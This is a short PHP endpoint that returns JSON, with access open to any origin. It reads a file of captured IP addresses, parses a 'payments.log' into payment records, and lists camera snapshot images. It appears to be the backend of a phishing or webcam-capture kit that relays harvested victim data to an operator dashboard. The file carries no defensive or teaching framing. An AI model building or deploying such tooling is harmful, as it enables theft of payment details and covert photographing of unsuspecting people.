<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$response = [
    'events' => [],
    'ips' => [],
    'payments' => [],
    'cameras' => [],
    'last_update' => date('Y-m-d H:i:s')
];

// Read IP captures
if (file_exists('saved.ips.txt')) {
    $ips = file('saved.ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($ips as $ip) {
        $response['ips'][] = [
            'ip' => trim($ip),
            'time' => date('H:i:s'),
            'timestamp' => time()
        ];
    }
}

// Read Payment Data
if (file_exists('payments.log')) {
    $content = file_get_contents('payments.log');
    $entries = explode("==========================\n", $content);
    foreach ($entries as $entry) {
        if (trim($entry) === '') continue;
        $payment = [];
        $lines = explode("\n", trim($entry));
        foreach ($lines as $line) {
            if (strpos($line, ':') !== false && !strpos($line, '===')) {
                list($key, $value) = explode(':', $line, 2);
                $payment[trim($key)] = trim($value);
            }
        }
        if (!empty($payment)) {
            $payment['timestamp'] = time();
            $response['payments'][] = $payment;
        }
    }
}

// Read Camera Snaps
$camFiles = glob('cam*.png');
foreach ($camFiles as $file) {
    $response['cameras'][] = [
        'filename' => basename($file),
        'url' => $file,
        'time' => date('H:i:s', filemtime($file)),
        'timestamp' => filemtime($file)
    ];
}

echo json_encode($response);
?>